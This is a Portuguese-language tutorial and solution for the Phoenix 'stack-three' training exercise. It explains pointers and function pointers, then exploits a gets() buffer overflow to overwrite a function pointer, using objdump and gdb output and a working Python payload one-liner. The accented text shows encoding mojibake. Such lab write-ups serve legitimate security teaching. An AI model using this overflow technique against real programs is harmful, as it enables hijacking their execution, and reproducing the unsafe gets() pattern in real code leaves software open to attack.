# üéØ Objetivo
Usar um pointer para retornar para uma fun√ß√£o pre existente

# üí° Dica
OBS: em Ingles! // [Wikipedia Pointer](https://en.wikipedia.org/wiki/Pointer_(computer_programming))

# üí´ Explica√ß√£o
  - O que raios s√£o pointers
  - Function pointers
  - Exploit
  
### ‚ÜóÔ∏è‚ÜòÔ∏è O que raios s√£o pointers
> Pointers s√£o uma estrutura que, ao inv√©s de armazenar dados, armazena o endere√ßo de outra estrutura.
Lembra do exemplo do po√ßo? Que cada item tinha seu endere√ßo na stack! Ent√£o, um pointer armazena esse endere√ßo! :D

O pointer pode ser visto como uma placa na estrada, indicando que X cidade est√° em Y dire√ß√£o.

Colunas: Nome da Vari√°vel | Endere√ßo | conte√∫do

![Imagem da wikipedia mostrando um pointer](./img/pointer.png)


A vari√°vel "a" √© um pointer que armazena a localiza√ß√£o da vari√°vel "b". Coloquialmente se diz que: "a" est√° apontando para "b" (seta vermelha).
> "a" armazena uma referencia √° "b" !

> "a" pode ser des-referenciada, isto √©: Seguir a dire√ß√£o que "a" aponta, para chegar no valor de "b" ! :D

Normalmente, o caracteres "&" indica uma refer√™ncia, e o caracteres "*" desreferencia aquele pointer.

> Caso voc√™ tente desrefenciar um pointer que n√£o aponta pra nada (NULL),
 o programa vai interromper a execu√ß√£o e soltar uma mensagem de erro!
> Ou vai ser classificado como "comportamento indefinido"! Por isso, voc√™ vai ver "Null Checks" 
bem frequentemente nesses desafios e em programas em geral!
### ü¶Ä Function Pointers
> Function pointers, ao inv√©s de armazenar o endere√ßo de uma vari√°vel, armazenam o endere√ßo de uma fun√ß√£o! :D

Sim! Fun√ß√µes tamb√©m s√£o armazenadas na Stack, e possuem seu endere√ßo! Esse endere√ßo pode ser encontrado por v√°rios m√©todos:
```
objdump -d <programa> | grep <nome_da_fun√ß√£o>


gdb <programa>
  (gdb)> info functions
```
Os dois m√©todos ser√£o demonstrados em breve! :D

### üî• Exploit
> Buffer overflow, alterando o valor de um function pointer, redirecionando a execu√ß√£o do programa.
> 
> Em lingua n√£o nerd, por favor? :P
> 
> O valor que sera corrompido pelo buffer overflow indica aonde a execu√ß√£o do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!

#### üõ∏ Analisando o programa
```C
fun√ß√£o complete_level() {   // a fun√ß√£o que a gente quer chamar
.......
}

fun√ß√£o main() {
  criar buffer[64];
  criar fp; // um function pointer
  
  fp = NULL; // vai ser usado para checar se ele foi alterado,
               // se continuar sendo NULL, quer dizer que esta intacto.
                
  
  gets(buffer) // fun√ß√£o INSEGURA para abrir um input
  
  if (fp) {    // se fp foi alterado
    fp()   // chama o endere√ßo salvo em fp como se fosse uma fun√ß√£o
  } else {
    print(valor nao alterado, tente novamente)
  }
  
  exit
}
```

N√≥s queremos chamar `complete_level()`, para isso, faremos `fp` salvar o seu endere√ßo.

E n√≥s j√° sabemos como exploitar um `gets()` para alterar os valores depois do `buffer`! Ent√£o t√° na hora do trabalho!

#### üè† Encontrando o endere√ßo da fun√ß√£o
```
objdump -d    // Resumindo, printa pro terminal os objetos armazenados na Stack e seus endere√ßos
                  ( O -d √© pra ativar a disassembly: Converter de machine code para algo leg√≠vel )!
gdb
```

objdump
```
$ objdump -d /opt/phoenix/amd64/stack-three | grep complete_level
000000000040069d <complete_level>:
```

gdb
```x86asm
$ gdb /opt/phoenix/amd64/stack-three                
---- Mensagens padr√£o foram removidas ----
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level              // Mesmo endere√ßo
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
```

> O endere√ßo da fun√ß√£o √© 0x000000000040069d ! :D

Presta aten√ß√£o na quantidade de null bytes que precedem o endere√ßo. Todo pointer come√ßa com pelo menos dois null bytes, 
e strings terminam com 1 null byte!

Assim, impedindo atacantes (n√≥s), de definir um pointer novo, pois quebraria a string do nosso 
input. N√≥s precisamos usar um que j√° esta na memoria! (  Spoiler hehehehe :D  )

Como nesse desafio o pointer ja existe (`fp`) e n√≥s s√≥ vamos mudar os bytes finais dele
 (Inteiro escreve na dire√ß√£o LE, lembra? Ent√£o n√£o vai interferir com os NULLs que vem antes)

Portanto n√£o precisamos nos preocupar com isso nesse desafio!

#### üòê Cansei de teoria eu quero exploit

Se voc√™ quer tentar por conta pr√≥pria, agora √© sua hora de brilhar!
```
Lembretes:
Little Endian, o buffer tem 64 bytes,
b"\x", e o input vem pelo gets()
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
eai, brilhou? ;)
```
O input que vamos passar fica:
b"A"*64     # encher o buffer (`padding`) \
\+ \
b"\x9d\x06\x40" # 0x40069d vira "9d 06 40" em LE

Ent√£o...
> $ python -c "print(b'A'*64 + b'\x9d\x06\x40')"

```C
calling function pointer @ 0x40069d <-- chamando complete_level()
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

Espero que voc√™ tenha gostado! :D

# üî• Solu√ß√£o

> $ python -c "print(b'A'*64 + b'\x9d\x06\x40')" | /opt/phoenix/amd64/stack-three 
```
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```
